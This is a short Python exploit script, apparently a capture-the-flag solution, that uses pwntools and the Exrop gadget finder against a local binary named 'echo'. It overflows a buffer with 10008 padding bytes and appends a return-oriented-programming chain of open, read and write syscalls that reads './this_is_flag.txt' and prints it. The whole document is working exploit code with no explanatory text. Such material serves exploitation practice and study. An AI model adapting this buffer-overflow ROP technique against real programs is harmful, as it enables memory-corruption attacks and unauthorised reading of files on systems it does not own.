from pwn import *
from Exrop import Exrop

binname = "echo"
elf = ELF(binname, checksec=False)
rwaddr = elf.bss()

SYS_OPEN = 2
SYS_READ = 0
SYS_WRITE = 1

rop = Exrop(binname)
rop.find_gadgets(cache=True)
chain = rop.syscall(SYS_OPEN, ('./this_is_flag.txt', 0, 0), rwaddr)
chain += rop.syscall(SYS_READ, ('rax', rwaddr, 0x40))
chain += rop.syscall(SYS_WRITE, (1, rwaddr, 0x40))
chain.dump()
buf = b"A"*10008
pay = buf + chain.payload_str()
p = process("./echo")
p.sendline(pay)
p.interactive()
